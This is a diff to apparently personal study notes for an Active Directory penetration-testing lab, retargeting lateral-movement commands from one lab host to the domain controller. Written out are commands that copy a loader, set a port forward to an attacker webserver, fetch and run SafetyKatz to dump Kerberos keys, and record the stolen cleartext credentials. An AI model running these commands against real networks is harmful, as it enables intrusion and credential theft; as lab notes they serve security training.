@@ -29,14 +29,14 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ### Lateral 1 (Local Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
 
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+$null | winrs -r:dcorp-dc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
 ```
 
 Download from local loopback
 ```powershell
-$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
+$null | winrs -r:dcorp-dc "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
